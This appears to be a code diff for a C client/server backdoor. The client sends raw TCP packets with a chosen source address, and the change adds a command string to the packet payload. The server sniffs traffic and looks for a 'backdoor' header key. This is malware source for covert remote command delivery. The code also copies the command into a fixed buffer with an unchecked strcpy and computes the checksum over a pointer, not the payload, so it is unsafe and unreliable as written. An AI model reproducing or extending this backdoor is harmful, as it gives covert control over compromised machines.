@@ -133,7 +133,7 @@ void client(struct client_opt c_opt){
         system_fatal("setsockopt");
     
     // Send packet
-    send_datagram(&user_addr);
+    send_datagram(&user_addr, c_opt.command);
     
     /* Listen for results and print */
     
@@ -220,19 +220,23 @@ void server(struct server_opt s_opt){
 | ------------------------------------------------------------------------------
 */
 
-int send_datagram(struct addr_info *user_addr){
+int send_datagram(struct addr_info *user_addr, char *data){
     
     /* Declare variables */
     
+    // Typecast datagram
     char datagram[PKT_SIZE];
-    struct iphdr *iph = (struct iphdr *) datagram;
-    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
-    struct sockaddr_in sin;
-    pseudo_header psh;
+    struct iphdr *iph = (struct iphdr *)datagram;
+    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
+    char *data_ptr = (char *)(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr));
     
+    struct sockaddr_in sin;    
     sin.sin_family = AF_INET;
     sin.sin_port = htons(user_addr->dport);
     sin.sin_addr.s_addr = inet_addr(user_addr->dhost);
+    
+    pseudo_header psh;
+    int data_len = strlen(data);
     
     // Zero out the buffer where the datagram will be stored
     memset(datagram, 0, PKT_SIZE);
@@ -242,7 +246,7 @@ int send_datagram(struct addr_info *user_addr){
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
-    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
+    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;
     iph->id = htonl(DEFAULT_IP_ID);
     iph->frag_off = 0;
     iph->ttl = DEFAULT_TTL;
@@ -270,30 +274,34 @@ int send_datagram(struct addr_info *user_addr){
     tcph->check = 0; // Initialize the checksum to zero (kernel's IP stack will fill in the correct checksum during transmission)
     tcph->urg_ptr = 0;
    
+    /* Data */
+    
+    strcpy(data_ptr, data);
+      
     /* Calculate Checksum */
     
     psh.source_address = inet_addr(user_addr->shost);
     psh.dest_address = sin.sin_addr.s_addr;
     psh.placeholder = 0;
     psh.protocol = IPPROTO_TCP;
-    psh.tcp_length = htons(20);
- 
-    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
- 
-    tcph->check = csum((unsigned short*) &psh , sizeof (pseudo_header));
+    psh.tcp_length = htons(sizeof(struct tcphdr) + data_len);
+    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
+    psh.data = data;
+    
+    tcph->check = csum((unsigned short*)&psh , sizeof(pseudo_header));
  
     /* Build our own header */
     
     {
         int one = 1;
         const int *val = &one;
-        if (setsockopt (user_addr->raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
+        if (setsockopt (user_addr->raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
             system_fatal("setsockopt");
     }
  
     /* Send the packet */
     
-    if(sendto(user_addr->raw_socket, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0){
+    if(sendto(user_addr->raw_socket, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
         system_fatal("sendto");
         return -1;
     }
@@ -323,7 +331,7 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
         return;
     }
     
-    printf("IP Protocol: %s\n", packet_info.payload);
+    printf("Test: %s\n", packet_info.payload);
     
     /* Check the packet for the header key meant for the backdoor */
     
